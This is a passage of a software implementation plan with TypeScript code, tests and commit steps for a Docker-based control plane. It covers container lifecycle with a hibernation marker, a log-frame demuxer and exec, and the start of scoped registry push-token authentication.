satisfies P2's contract test *"stopInstance hibernates rather than destroys"* while
making a **crashed application report as hibernated**, so §11's state machine never
sees `failed`, no Event is raised (§14), and the app is quietly dead with a
reassuring status. That is the exact shape of bug this project keeps paying for.

So `stopInstance` writes a **marker volume**, `mf-…-app-hibernated`, and
`ensureInstance` removes it on the way back up. It is durable across a control-plane
restart, visible in `docker volume ls`, and costs nothing. `exited` **with** the
marker is `hibernated`; `exited` **without** it is `failed`.

**Health comes from Docker's own healthcheck, which runs inside the container.**
§21 is right that a host process cannot reach container IPs — but a `HEALTHCHECK`
executes in the container's own namespace and the result is readable from the API as
`State.Health.Status`. That is what `status().healthy` reads. **It is not the same
question as "is the app reachable at its hostname"**, which needs DNS, a Caddy route
and a listener; that is Task 14, and it is why the two are separate tasks.

**The healthcheck is a blueprint contract.** The command uses BusyBox `wget`, which
`node:22-alpine` provides. D13 makes the Dockerfile the blueprint's, so "the image
can run the healthcheck" is a property blueprints must keep; Task 17's fixture
proves it for the one blueprint that exists.

- [ ] **Step 1: Write the failing unit test**

`packages/control-plane/src/runtime/docker/instances.test.ts`:

```ts
import { describe, expect, it } from 'vitest'
import { dockerStateToInstanceState } from './instances.js'

const state = (over: Partial<Parameters<typeof dockerStateToInstanceState>[0]> = {}) => ({
  Status: 'running', ExitCode: 0, hibernationMarker: false, ...over,
})

describe('Docker state -> §11 InstanceState', () => {
  it('maps a running, healthy container to healthy', () => {
    expect(dockerStateToInstanceState(state({ Health: { Status: 'healthy' } }))).toBe('healthy')
  })

  it('maps a running container that has not passed its healthcheck to starting', () => {
    expect(dockerStateToInstanceState(state({ Health: { Status: 'starting' } }))).toBe('starting')
    expect(dockerStateToInstanceState(state({ Health: undefined }))).toBe('starting')
  })

  it('maps a running container failing its healthcheck to failed', () => {
    expect(dockerStateToInstanceState(state({ Health: { Status: 'unhealthy' } }))).toBe('failed')
  })

  it('maps created to starting and removing to destroying', () => {
    expect(dockerStateToInstanceState(state({ Status: 'created' }))).toBe('starting')
    expect(dockerStateToInstanceState(state({ Status: 'removing' }))).toBe('destroying')
  })

  // THE DISTINCTION THIS FUNCTION EXISTS FOR. Docker leaves both in `exited`.
  it('maps a deliberate stop to hibernated and a crash to failed', () => {
    expect(dockerStateToInstanceState(state({ Status: 'exited', ExitCode: 0, hibernationMarker: true })))
      .toBe('hibernated')
    // Same exit code, no marker: nobody asked for this. It is a failure.
    expect(dockerStateToInstanceState(state({ Status: 'exited', ExitCode: 0, hibernationMarker: false })))
      .toBe('failed')
    expect(dockerStateToInstanceState(state({ Status: 'exited', ExitCode: 137, hibernationMarker: false })))
      .toBe('failed')
    // A marker plus a non-zero code is still a stop we asked for: `docker stop`
    // SIGKILLs a container that ignores SIGTERM, and 137 is what that looks like.
    expect(dockerStateToInstanceState(state({ Status: 'exited', ExitCode: 137, hibernationMarker: true })))
      .toBe('hibernated')
  })

  it('maps dead to failed', () => {
    expect(dockerStateToInstanceState(state({ Status: 'dead' }))).toBe('failed')
  })
})
```

- [ ] **Step 2: Run it to make sure it fails**

```bash
pnpm --filter @manifest/control-plane test src/runtime/docker/instances
```

Expected: FAIL — `Cannot find module './instances.js'`.

- [ ] **Step 3: Write the instance module**

`packages/control-plane/src/runtime/docker/instances.ts`:

```ts
import type { InstanceHandle, InstanceSpec, InstanceState, InstanceStatus } from '../driver.js'
import type { EngineClient } from './engine.js'
import { hardenedHostConfig } from './hardening.js'
import { appContainer } from './names.js'
import { proxyEnvironment } from './egress.js'

export interface DockerState {
  Status: string
  ExitCode: number
  Health?: { Status: string }
  /** Our own marker volume. Docker cannot tell a stop from a crash; this can. */
  hibernationMarker: boolean
}

const hibernationVolume = (container: string) => `${container}-hibernated`

/**
 * `exited` is BOTH hibernation and a crash in Docker's vocabulary. Mapping it to
 * `hibernated` unconditionally passes the contract suite and makes a dead app look
 * asleep — §11's state machine would never reach `failed`, so no Event is raised
 * and nothing backs off. The marker volume is what makes the two distinguishable.
 */
export function dockerStateToInstanceState(state: DockerState): InstanceState {
  switch (state.Status) {
    case 'created':
    case 'restarting':
      return 'starting'
    case 'running':
      if (state.Health?.Status === 'healthy') return 'healthy'
      if (state.Health?.Status === 'unhealthy') return 'failed'
      return 'starting'
    case 'removing':
      return 'destroying'
    case 'exited':
      return state.hibernationMarker ? 'hibernated' : 'failed'
    case 'dead':
    default:
      return 'failed'
  }
}

export interface InstanceDeps {
  networkName: string
  dnsServer: string
  proxyUrl: string
  hostname: string
  diskQuotaEnforceable: boolean
}

export async function ensureInstanceContainer(
  engine: EngineClient,
  spec: InstanceSpec,
  deps: InstanceDeps,
): Promise<InstanceHandle> {
  const name = appContainer(spec.name)
  const url = `https://${deps.hostname}`
  const existing = await engine.get<{ Id: string; State: { Running: boolean } }>(
    `/containers/${name}/json`,
  )
  if (existing) {
    if (!existing.State.Running) await engine.post(`/containers/${name}/start`)
    // Waking: the marker goes as soon as we intend it to run again, so a crash
    // one second later is reported as a crash rather than as hibernation.
    await engine.del(`/volumes/${hibernationVolume(name)}?force=true`)
    return { id: name, name, url }
  }

  await engine.post(`/containers/create?name=${name}`, {
    // §13: the digest, never the tag. An approval binds to this string.
    Image: `${spec.image.repository}@${spec.image.digest}`,
    Env: [
      ...Object.entries(spec.env).map(([k, v]) => `${k}=${v}`),
      ...Object.entries(proxyEnvironment(deps.proxyUrl)).map(([k, v]) => `${k}=${v}`),
    ],
    ExposedPorts: { [`${spec.port}/tcp`]: {} },
    // Runs INSIDE the container, so §21's "a host process cannot reach container
    // IPs" does not apply. BusyBox wget is a blueprint contract (D13).
    Healthcheck: {
      Test: ['CMD-SHELL', `wget -q -O /dev/null http://127.0.0.1:${spec.port}${spec.healthPath} || exit 1`],
      Interval: 3_000_000_000,
      Timeout: 2_000_000_000,
      Retries: 20,
      StartPeriod: 2_000_000_000,
    },
    HostConfig: hardenedHostConfig({
      resources: spec.resources,
      networkName: deps.networkName,
      dnsServer: deps.dnsServer,
      diskQuotaEnforceable: deps.diskQuotaEnforceable,
    }),
    Labels: {
      'manifest.slug': spec.projectSlug,
      'manifest.environment': spec.environmentKind,
      'manifest.release': spec.releaseId,
    },
  })
  await engine.del(`/volumes/${hibernationVolume(name)}?force=true`)
  await engine.post(`/containers/${name}/start`)
  return { id: name, name, url }
}

/** §11: hibernate — volumes survive. S1 verified the Mongo row count rose across it. */
export async function stopInstanceContainer(engine: EngineClient, id: string): Promise<void> {
  await engine.post(`/volumes/create`, { Name: hibernationVolume(id), Labels: { 'manifest.marker': 'hibernated' } })
  await engine.post(`/containers/${id}/stop?t=10`)
}

export async function destroyInstanceContainer(engine: EngineClient, id: string): Promise<void> {
  // `v=true` removes anonymous volumes only; named service volumes are D3's and
  // are removed by destroyService, which is the call that carries `deleteData`.
  await engine.del(`/containers/${id}?force=true&v=true`)
  await engine.del(`/volumes/${hibernationVolume(id)}?force=true`)
}

export async function instanceStatus(engine: EngineClient, id: string): Promise<InstanceStatus> {
  const inspect = await engine.get<{
    State: { Status: string; ExitCode: number; Health?: { Status: string }; Error?: string }
  }>(`/containers/${id}/json`)
  // 404 -> undefined (Task 1). §11 and the contract both require `gone`, never a throw.
  if (!inspect) return { id, state: 'gone', healthy: false }
  const marker = (await engine.get(`/volumes/${hibernationVolume(id)}`)) !== undefined
  const state = dockerStateToInstanceState({ ...inspect.State, hibernationMarker: marker })
  return {
    id,
    state,
    healthy: inspect.State.Health?.Status === 'healthy',
    message: inspect.State.Error === '' ? undefined : inspect.State.Error,
  }
}
```

- [ ] **Step 4: Write the Docker-tier test**

`packages/control-plane/src/runtime/docker/instances.docker.test.ts`:

```ts
import { afterAll, beforeAll, expect, it } from 'vitest'
import type { InstanceSpec } from '../driver.js'
import { instanceName } from '../driver.js'
import { createEngineClient, resolveSocketPath } from './engine.js'
import { describeDocker } from './docker-tier.js'
import { destroyEgressProxy, ensureEgressProxy } from './egress.js'
import { appContainer } from './names.js'
import { destroyAppNetwork, ensureAppNetwork } from './networks.js'
import {
  destroyInstanceContainer, ensureInstanceContainer, instanceStatus, stopInstanceContainer,
} from './instances.js'

const engine = createEngineClient({ socketPath: resolveSocketPath() })
const SLUG = 'insttest'
const RELEASE = '9f1c4d2e-7a3b-4c5d-8e6f-0a1b2c3d4e5f'
let deps: Parameters<typeof ensureInstanceContainer>[2]

// A container that serves nothing: this task tests lifecycle, not the app. Task 17
// runs the real fixture app.
const spec = (): InstanceSpec => ({
  name: instanceName(SLUG, 'staging', RELEASE),
  projectSlug: SLUG,
  environmentKind: 'staging',
  releaseId: RELEASE,
  image: {
    repository: 'alpine',
    digest: 'sha256:d9e853e87e55526f6b2917df91a2115c36dd7c696a35be12163d44e6e2a4b6bc',
  },
  env: { MANIFEST_ENV: 'staging' },
  port: 8080,
  healthPath: '/healthz',
  resources: { cpu: 0.5, memoryMi: 128, pids: 64, diskMi: 512 },
  services: [],
  egressAllow: [],
})

describeDocker('instance lifecycle (§11)', () => {
  beforeAll(async () => {
    await ensureAppNetwork(engine, SLUG, 'staging')
    const proxy = await ensureEgressProxy(engine, { slug: SLUG, kind: 'staging', allow: [] })
    deps = {
      networkName: 'mf-insttest-staging-net',
      dnsServer: '10.89.0.53',
      proxyUrl: proxy.url,
      hostname: `${SLUG}.staging.manifest.internal`,
      diskQuotaEnforceable: false,
    }
  })
  afterAll(async () => {
    await destroyInstanceContainer(engine, appContainer(spec().name))
    await destroyEgressProxy(engine, SLUG, 'staging')
    await destroyAppNetwork(engine, SLUG, 'staging')
  })

  it('is idempotent — the second call does not create a second container', async () => {
    const first = await ensureInstanceContainer(engine, spec(), deps)
    const second = await ensureInstanceContainer(engine, spec(), deps)
    expect(second.id).toBe(first.id)
    const all = await engine.get<{ Id: string }[]>(
      `/containers/json?all=true&filters=${encodeURIComponent(JSON.stringify({ name: [first.name] }))}`,
    )
    expect(all!.length).toBe(1)
  })

  it('runs the image by DIGEST, which is what an approval binds to (§13)', async () => {
    const inspect = await engine.get<{ Config: { Image: string } }>(
      `/containers/${appContainer(spec().name)}/json`,
    )
    expect(inspect!.Config.Image).toContain('@sha256:')
  })

  it('reports hibernated after a stop, and wakes to the same container', async () => {
    const handle = await ensureInstanceContainer(engine, spec(), deps)
    await stopInstanceContainer(engine, handle.id)
    expect((await instanceStatus(engine, handle.id)).state).toBe('hibernated')
    const woken = await ensureInstanceContainer(engine, spec(), deps)
    expect(woken.id).toBe(handle.id)
    expect((await instanceStatus(engine, handle.id)).state).not.toBe('hibernated')
  })

  // The distinction the marker volume exists for, against a real daemon.
  it('reports a container that stopped on its own as failed, not hibernated', async () => {
    const handle = await ensureInstanceContainer(engine, spec(), deps)
    // Kill it the way a crash would, without going through stopInstance.
    await engine.post(`/containers/${handle.id}/kill`)
    expect((await instanceStatus(engine, handle.id)).state).toBe('failed')
  })

  it('reports an unknown id as gone rather than throwing', async () => {
    expect((await instanceStatus(engine, 'mf-no-such-container')).state).toBe('gone')
  })

  it('destroys idempotently', async () => {
    await ensureInstanceContainer(engine, spec(), deps)
    const id = appContainer(spec().name)
    await destroyInstanceContainer(engine, id)
    await expect(destroyInstanceContainer(engine, id)).resolves.toBeUndefined()
    expect((await instanceStatus(engine, id)).state).toBe('gone')
  })
})
```

- [ ] **Step 5: Run both tiers**

```bash
pnpm test && pnpm test:docker
```

Expected: 6 unit tests, 6 Docker tests.

- [ ] **Step 6: Prove the marker is what separates hibernation from a crash**

In `dockerStateToInstanceState`, change the `exited` branch to `return 'hibernated'`.

Expected: **FAIL** on *"maps a deliberate stop to hibernated and a crash to failed"*
(unit) and on *"reports a container that stopped on its own as failed"* (Docker) —
and on nothing else. Restore it.

**Note which tests do *not* fail.** P2's contract test *"stopInstance hibernates
rather than destroys"* stays green through the broken version, because the naive
mapping satisfies it. That is precisely why this task carries its own tests instead of
leaning on the contract suite: a shared suite pins the interface, not every property
of an implementation.

- [ ] **Step 7: Commit**

```bash
git add packages/control-plane/src/runtime/docker/instances.ts packages/control-plane/src/runtime/docker/instances.test.ts packages/control-plane/src/runtime/docker/instances.docker.test.ts
git commit -m "feat(runtime): instance lifecycle, with hibernation distinguished from a crash

Docker leaves both in `exited`. A marker volume separates them, so a dead app
reaches `failed` instead of reporting as asleep."
```

---

## Task 8: Logs as an `AsyncIterable`, and `exec`

**Files:**
- Create: `packages/control-plane/src/runtime/docker/logs.ts`
- Create: `packages/control-plane/src/runtime/docker/exec.ts`
- Test: `packages/control-plane/src/runtime/docker/logs.test.ts`
- Test: `packages/control-plane/src/runtime/docker/logs.docker.test.ts`

**Interfaces:**
- Consumes: `EngineClient` (Task 1); `LogLine`, `LogOpts`, `ExecOpts`, `ExecStream` from `../driver.js`.
- Produces:
  - `demux(source: AsyncIterable<Buffer>): AsyncIterable<LogLine>`
  - `containerLogs(engine, id, opts): AsyncIterable<LogLine>`
  - `containerExec(engine, id, cmd, opts): ExecStream`

**The Engine API multiplexes stdout and stderr into one stream with an 8-byte frame
header** — `[stream_type][000][size:u32be][payload]` — and S1 demuxed it in about
forty dependency-free lines. **The frame header can be split across chunk
boundaries**, and a demuxer that assumes otherwise works on every small test and
fails on a chatty container, so the buffer is carried between chunks and the unit
test feeds the frames one byte at a time to force it.

**`exec` is implemented and smoke-tested here; S5 owns the sandbox path.** S1 never
exercised it, and this plan does not claim it is proven for the use §11 reserves it
for. `capabilities().supportsExec` is nonetheless `true`, because the operation
genuinely works and reporting `false` would be a different lie.

- [ ] **Step 1: Write the failing unit test**

`packages/control-plane/src/runtime/docker/logs.test.ts`:

```ts
import { describe, expect, it } from 'vitest'
import type { LogLine } from '../driver.js'
import { demux } from './logs.js'

/** Builds the Engine API's framed format: [type][000][size:u32be][payload]. */
function frame(stream: 1 | 2, text: string): Buffer {
  const payload = Buffer.from(text, 'utf8')
  const header = Buffer.alloc(8)
  header[0] = stream
  header.writeUInt32BE(payload.length, 4)
  return Buffer.concat([header, payload])
}

async function* once(buffers: Buffer[]): AsyncIterable<Buffer> {
  for (const b of buffers) yield b
}

const collect = async (source: AsyncIterable<LogLine>): Promise<LogLine[]> => {
  const out: LogLine[] = []
  for await (const line of source) out.push(line)
  return out
}

describe('the Docker log frame demuxer', () => {
  it('separates stdout from stderr', async () => {
    const lines = await collect(demux(once([frame(1, 'hello\n'), frame(2, 'oops\n')])))
    expect(lines.map((l) => [l.stream, l.text])).toEqual([
      ['stdout', 'hello'],
      ['stderr', 'oops'],
    ])
  })

  it('splits a multi-line frame into one LogLine per line', async () => {
    const lines = await collect(demux(once([frame(1, 'a\nb\nc\n')])))
    expect(lines.map((l) => l.text)).toEqual(['a', 'b', 'c'])
  })

  // THE TEST THAT MATTERS. A demuxer that assumes a chunk contains whole frames
  // passes every small test and corrupts output from a chatty container.
  it('reassembles a frame split across chunk boundaries', async () => {
    const whole = Buffer.concat([frame(1, 'split-across-chunks\n'), frame(2, 'and-this-one\n')])
    const oneByteAtATime = [...whole].map((b) => Buffer.from([b]))
    const lines = await collect(demux(once(oneByteAtATime)))
    expect(lines.map((l) => [l.stream, l.text])).toEqual([
      ['stdout', 'split-across-chunks'],
      ['stderr', 'and-this-one'],
    ])
  })

  it('emits a trailing line that has no newline', async () => {
    const lines = await collect(demux(once([frame(1, 'no trailing newline')])))
    expect(lines.map((l) => l.text)).toEqual(['no trailing newline'])
  })

  it('gives every line a timestamp', async () => {
    const [line] = await collect(demux(once([frame(1, 'x\n')])))
    expect(line.at).toBeInstanceOf(Date)
  })
})
```

- [ ] **Step 2: Run it to make sure it fails**

```bash
pnpm --filter @manifest/control-plane test src/runtime/docker/logs
```

Expected: FAIL — `Cannot find module './logs.js'`.

- [ ] **Step 3: Write the demuxer and the log stream**

`packages/control-plane/src/runtime/docker/logs.ts`:

```ts
import type { LogLine, LogOpts } from '../driver.js'
import type { EngineClient } from './engine.js'

const HEADER = 8

/**
 * The Engine API frames its multiplexed stream as
 * `[stream_type:u8][000][size:u32be][payload]`. Nothing guarantees a chunk holds a
 * whole frame — or even a whole header — so both are carried across chunks. S1 wrote
 * this in about forty lines and it needs no library.
 */
export async function* demux(source: AsyncIterable<Buffer>): AsyncIterable<LogLine> {
  let buffer = Buffer.alloc(0)
  const partial: Record<'stdout' | 'stderr', string> = { stdout: '', stderr: '' }

  const flush = function* (stream: 'stdout' | 'stderr', text: string, final: boolean) {
    const combined = partial[stream] + text
    const lines = combined.split('\n')
    partial[stream] = final ? '' : (lines.pop() ?? '')
    if (final && lines.length > 0 && lines.at(-1) === '') lines.pop()
    for (const line of lines) yield { at: new Date(), stream, text: line }
  }

  for await (const chunk of source) {
    buffer = Buffer.concat([buffer, chunk])
    for (;;) {
      if (buffer.length < HEADER) break
      const size = buffer.readUInt32BE(4)
      if (buffer.length < HEADER + size) break
      const stream = buffer[0] === 2 ? 'stderr' : 'stdout'
      const payload = buffer.subarray(HEADER, HEADER + size).toString('utf8')
      buffer = buffer.subarray(HEADER + size)
      yield* flush(stream, payload, false)
    }
  }
  // Whatever is left has no trailing newline. Dropping it loses the last line of
  // a crash message, which is the line anybody reading logs actually wants.
  for (const stream of ['stdout', 'stderr'] as const) {
    if (partial[stream] !== '') yield { at: new Date(), stream, text: partial[stream] }
  }
}

export async function* containerLogs(
  engine: EngineClient,
  id: string,
  opts: LogOpts,
): AsyncIterable<LogLine> {
  const query = new URLSearchParams({
    stdout: 'true',
    stderr: 'true',
    follow: String(opts.follow ?? false),
    tail: String(opts.tail ?? 'all'),
  })
  const res = await engine.stream(`/containers/${id}/logs?${query.toString()}`)
  try {
    yield* demux(res as unknown as AsyncIterable<Buffer>)
  } finally {
    // §11's `logs` is an AsyncIterable, so a consumer may `break`. Destroying the
    // response is what closes the socket instead of leaking it per aborted stream.
    res.destroy()
  }
}
```

`packages/control-plane/src/runtime/docker/exec.ts`:

```ts
import type { ExecOpts, ExecStream } from '../driver.js'
import type { EngineClient } from './engine.js'
import { demux } from './logs.js'

/**
 * Implemented and smoke-tested. **S5 owns the sandbox use of this** — S1 never
 * exercised `exec` and nothing here claims it is proven for running an agent.
 * `capabilities().supportsExec` is true because the operation works, which is a
 * different claim from "the sandbox story is settled".
 */
export function containerExec(
  engine: EngineClient,
  id: string,
  cmd: string[],
  opts: ExecOpts,
): ExecStream {
  const stdoutLines: string[] = []
  const stderrLines: string[] = []
  let resolveExit: (code: number) => void = () => {}
  const exitCode = new Promise<number>((resolve) => (resolveExit = resolve))

  const started = (async () => {
    const created = await engine.post<{ Id: string }>(`/containers/${id}/exec`, {
      AttachStdout: true,
      AttachStderr: true,
      Cmd: cmd,
      WorkingDir: opts.cwd,
      Env: Object.entries(opts.env ?? {}).map(([k, v]) => `${k}=${v}`),
    })
    const res = await engine.stream(`/exec/${created!.Id}/start`, 'POST', { Detach: false, Tty: false })
    for await (const line of demux(res as unknown as AsyncIterable<Buffer>)) {
      ;(line.stream === 'stderr' ? stderrLines : stdoutLines).push(line.text)
    }
    const info = await engine.get<{ ExitCode: number | null }>(`/exec/${created!.Id}/json`)
    resolveExit(info?.ExitCode ?? -1)
  })()

  const drain = async function* (buffer: string[]): AsyncIterable<string> {
    await started
    for (const line of buffer) yield line
  }

  return { stdout: drain(stdoutLines), stderr: drain(stderrLines), exitCode }
}
```

- [ ] **Step 4: Write the Docker-tier test**

`packages/control-plane/src/runtime/docker/logs.docker.test.ts`:

```ts
import { afterAll, expect, it } from 'vitest'
import type { LogLine } from '../driver.js'
import { createEngineClient, resolveSocketPath } from './engine.js'
import { describeDocker } from './docker-tier.js'
import { containerLogs } from './logs.js'
import { containerExec } from './exec.js'

const engine = createEngineClient({ socketPath: resolveSocketPath() })
const NAME = 'mf-logtest-staging-app'

describeDocker('logs and exec against a real container', () => {
  afterAll(async () => {
    await engine.del(`/containers/${NAME}?force=true&v=true`)
  })

  it('demuxes a real container\'s stdout and stderr', async () => {
    await engine.del(`/containers/${NAME}?force=true&v=true`)
    await engine.post(`/containers/create?name=${NAME}`, {
      // alpine:3.22, NOT 3.20. P1's infra/images.txt mirrors 3.22 into the local
    // registry and `make seed` pulls it; 3.20 is in neither, so this step would
    // fail the moment the network is off — which is this plan's own demo.
    Image: 'alpine:3.22',
      Cmd: ['sh', '-c', 'echo to-stdout; echo to-stderr >&2; sleep 60'],
      HostConfig: { NetworkMode: 'none' },
    })
    await engine.post(`/containers/${NAME}/start`)
    await new Promise((r) => setTimeout(r, 1500))

    const lines: LogLine[] = []
    for await (const line of containerLogs(engine, NAME, { tail: 20 })) lines.push(line)
    expect(lines.find((l) => l.stream === 'stdout')?.text).toBe('to-stdout')
    expect(lines.find((l) => l.stream === 'stderr')?.text).toBe('to-stderr')
  })

  it('closes the stream when the consumer breaks out of the loop', async () => {
    let seen = 0
    for await (const _line of containerLogs(engine, NAME, { follow: true, tail: 100 })) {
      seen += 1
      break
    }
    expect(seen).toBe(1)
  })

  it('runs exec and reports stdout and the exit code', async () => {
    const stream = containerExec(engine, NAME, ['sh', '-c', 'echo hi; exit 3'], {})
    const out: string[] = []
    for await (const line of stream.stdout) out.push(line)
    expect(out).toContain('hi')
    expect(await stream.exitCode).toBe(3)
  })
})
```

- [ ] **Step 5: Run both tiers**

```bash
pnpm test && pnpm test:docker
```

Expected: 5 unit tests, 3 Docker tests.

- [ ] **Step 6: Prove the frame-reassembly test has teeth**

Replace the `if (buffer.length < HEADER + size) break` guard with
`if (buffer.length < HEADER) break` — i.e. assume a chunk always holds a whole frame.

Expected: **FAIL** on *"reassembles a frame split across chunk boundaries"* only.
Restore it.

The other four unit tests stay green, because each of them delivers a whole frame in
one chunk. Without the byte-at-a-time test this defect ships and shows up as truncated
build logs under load.

- [ ] **Step 7: Commit**

```bash
git add packages/control-plane/src/runtime/docker/logs.ts packages/control-plane/src/runtime/docker/exec.ts packages/control-plane/src/runtime/docker/logs.test.ts packages/control-plane/src/runtime/docker/logs.docker.test.ts
git commit -m "feat(runtime): dependency-free log demux and exec

The demuxer is fed one byte at a time in test, because a chunk is not a frame."
```

---

## Task 9: The scoped registry push token

**Files:**
- Create: `packages/control-plane/src/runtime/docker/registry-auth.ts`
- Create: `packages/control-plane/src/runtime/docker/testing.ts`
- Create: `packages/control-plane/src/api/routes/registry-token.ts`
- Modify: `packages/control-plane/src/api/server.ts` (register the route)
- Modify: `packages/control-plane/src/config.ts` (`registryTokenKeyPath`, `registryTokenCertPath`, `buildCredentialSecret`, `registryUrl`, `registryInternalUrl`)
- Modify: `infra/compose.yaml` (registry gains token auth)
- Create: `infra/seed/mint-token.mjs`
- Modify: `infra/seed/seed.sh`, `infra/seed/mirror-images.sh`, `scripts/verify.sh`
- Test: `packages/control-plane/src/runtime/docker/registry-auth.test.ts`
- Test: `packages/control-plane/src/runtime/docker/registry-auth.docker.test.ts`

**Interfaces:**
- Consumes: `Config` (P2 Task 12).
- Produces:
  - `interface Grant { type: string; name: string; actions: string[] }`
  - `parseScopeStrings(raw: readonly string[]): Grant[]`
  - `applyGrantPolicy(authorizedRepository: string, requested: readonly Grant[]): Grant[]`
  - `mintRegistryToken(keyPem, certPem, input): string`
  - `issueBuildCredential(secret, input): { username: string; password: string }`
  - `verifyBuildCredential(secret, username, password, now?): { repository: string } | undefined`
  - `registryTokenRoutes(deps: RegistryTokenDeps): FastifyPluginAsync`

**This task is [`../spikes/S1-controls-settled.md`](../spikes/S1-controls-settled.md)
written as code.** §13's *"the image registry rejects pushes from app and sandbox
contexts. Only the builder may push. Without this, 'promotion never rebuilds' is
defeated by overwriting a tag"* is not implementable without it, and nobody had made
`registry:2` do scoped auth before that probe. Everything below was measured.

**Four mechanics that are not guessable:**

1. **Docker 29 and BuildKit use the OAuth2 POST form grant** — not GET plus `Authorization: Basic`. The identity arrives as `username` in the **form body**, and the scopes as a **single space-separated `scope` field**. An issuer written only for the GET form sees `POST /token auth=(none)`, grants nothing, and the failure is indistinguishable from a legitimate scope refusal.
2. **The client, not the builder, fetches the token.** Measured with the realm at an address the builder could not reach: the build pushed anyway and the request arrived from the host. So this route lives on the control plane and nothing new joins the internal build network.
3. **buildx asks for more than it needs** — `repository:base/alpine:pull,push` for an image it only reads. Trimming the grant is safe and the build still succeeds, so the policy is strict rather than permissive.
4. **`registry:2` refuses with `401 UNAUTHORIZED`, never `403`**, naming what it wanted in `errors[].detail`. A driver that separates "wrong repository" from "no credential" by status code will get it wrong.

**Negative-control a signature by changing the key, never by editing the token text.**
Flipping the last base64url character of an RS256 signature changes only padding bits;
both spellings decode to byte-identical bytes and the registry accepts both. That looks
exactly like "the signature is not verified" and is not.

- [ ] **Step 1: Generate the test fixture issuer**

```bash
mkdir -p packages/control-plane/src/runtime/docker/__fixtures__
openssl req -x509 -newkey rsa:2048 -nodes -days 3650 \
  -keyout packages/control-plane/src/runtime/docker/__fixtures__/token.key \
  -out    packages/control-plane/src/runtime/docker/__fixtures__/token.crt \
  -subj "/CN=manifest-test-issuer"
```

This fixture is **test-only and committed**; it signs nothing outside the test suite,
and the real issuer keypair is generated by `make seed` into `infra/registry-auth/`,
which is gitignored. Say so in a comment at the top of `testing.ts` — a committed
private key is exactly what Task 11's secret scanner should flag, and a reader needs
one line to tell a fixture from an incident.

`packages/control-plane/src/runtime/docker/testing.ts`:

```ts
import { readFileSync } from 'node:fs'

/**
 * A throwaway self-signed issuer for tests only. Committed deliberately: it signs
 * nothing outside this suite, and the real keypair is generated by `make seed` into
 * the gitignored `infra/registry-auth/`. `testing.ts` is the second public entry
 * point P2 Task 1's boundary rule allows, so this never reaches `index.ts` and
 * therefore never reaches the shipped bundle.
 */
export function testIssuer(): { keyPem: string; certPem: string } {
  const at = (file: string) => new URL(`./__fixtures__/${file}`, import.meta.url)
  return {
    keyPem: readFileSync(at('token.key'), 'utf8'),
    certPem: readFileSync(at('token.crt'), 'utf8'),
  }
}
```

- [ ] **Step 2: Write the failing unit test**

`packages/control-plane/src/runtime/docker/registry-auth.test.ts`:

```ts
import { X509Certificate } from 'node:crypto'
import { describe, expect, it } from 'vitest'
import {
  applyGrantPolicy, issueBuildCredential, mintRegistryToken, parseScopeStrings, verifyBuildCredential,
} from './registry-auth.js'
import { testIssuer } from './testing.js'

const { keyPem, certPem } = testIssuer()
const SECRET = 's'.repeat(32)

const decode = (token: string) =>
  JSON.parse(Buffer.from(token.split('.')[1], 'base64url').toString()) as {
    iss: string; aud: string; sub: string; exp: number; nbf: number; jti: string
    access: { type: string; name: string; actions: string[] }[]
  }

describe('scope parsing (the shape Docker actually sends)', () => {
  // ONE field, space-separated, not repeated parameters. Observed from both
  // `docker push` (client_id=containerd-client) and buildx (client_id=buildkit-client).
  it('splits one space-separated scope field into several grants', () => {
    expect(
      parseScopeStrings(['repository:local/chem-labs:pull repository:base/alpine:pull,push']),
    ).toEqual([
      { type: 'repository', name: 'local/chem-labs', actions: ['pull'] },
      { type: 'repository', name: 'base/alpine', actions: ['pull', 'push'] },
    ])
  })

  it('keeps a multi-segment repository path intact', () => {
    expect(parseScopeStrings(['repository:local/a/b/c:push'])[0].name).toBe('local/a/b/c')
  })
})

describe('the grant policy (§13)', () => {
  it('grants what was asked on this build own repository', () => {
    expect(
      applyGrantPolicy('local/chem-labs', [
        { type: 'repository', name: 'local/chem-labs', actions: ['pull', 'push'] },
      ]),
    ).toEqual([{ type: 'repository', name: 'local/chem-labs', actions: ['pull', 'push'] }])
  })

  // THE CONTROL. §13: only the builder may push, and only to its own path.
  it('grants NOTHING on another project repository', () => {
    expect(
      applyGrantPolicy('local/chem-labs', [
        { type: 'repository', name: 'local/other-app', actions: ['pull', 'push'] },
      ]),
    ).toEqual([{ type: 'repository', name: 'local/other-app', actions: [] }])
  })

  // buildx asks for pull,push on base images it only reads. Trim rather than refuse:
  // refusing breaks every build, granting push lets one build replace the base image
  // every other app on the platform is built from.
  it('trims base images to pull, and the build still works', () => {
    expect(
      applyGrantPolicy('local/chem-labs', [
        { type: 'repository', name: 'base/node', actions: ['pull', 'push'] },
      ]),
    ).toEqual([{ type: 'repository', name: 'base/node', actions: ['pull'] }])
  })

  it('grants nothing for a non-repository scope such as registry:catalog', () => {
    expect(
      applyGrantPolicy('local/chem-labs', [{ type: 'registry', name: 'catalog', actions: ['*'] }]),
    ).toEqual([{ type: 'registry', name: 'catalog', actions: [] }])
  })
})

describe('the minted token', () => {
  it('carries the claims registry:2 validates, and the certificate in x5c', () => {
    const token = mintRegistryToken(keyPem, certPem, {
      issuer: 'manifest-control-plane',
      service: 'manifest-registry',
      subject: 'build-1',
      access: [{ type: 'repository', name: 'local/chem-labs', actions: ['pull', 'push'] }],
    })
    const header = JSON.parse(Buffer.from(token.split('.')[0], 'base64url').toString()) as {
      alg: string; x5c: string[]
    }
    expect(header.alg).toBe('RS256')
    expect(header.x5c).toHaveLength(1)
    expect(() => new X509Certificate(Buffer.from(header.x5c[0], 'base64'))).not.toThrow()

    const claims = decode(token)
    expect(claims.iss).toBe('manifest-control-plane')
    expect(claims.aud).toBe('manifest-registry')
    expect(claims.access[0].name).toBe('local/chem-labs')
    expect(claims.exp - claims.nbf).toBeLessThanOrEqual(600)
    expect(claims.jti).toMatch(/[0-9a-f-]{36}/)
  })
})

describe('the build credential the token endpoint verifies', () => {
  const cred = (repository: string, expiresAt: number) =>
    issueBuildCredential(SECRET, { repository, buildId: 'b1', expiresAt })

  it('round-trips and names the repository the build may push to', () => {
    const c = cred('local/chem-labs', Date.now() + 60_000)
    expect(c.username).toBe('local/chem-labs')
    expect(verifyBuildCredential(SECRET, c.username, c.password)).toEqual({
      repository: 'local/chem-labs',
    })
  })

  it('refuses a credential presented for a different repository', () => {
    const c = cred('local/chem-labs', Date.now() + 60_000)
    expect(verifyBuildCredential(SECRET, 'local/other-app', c.password)).toBeUndefined()
  })

  it('refuses an expired credential', () => {
    const c = cred('local/chem-labs', Date.now() - 1)
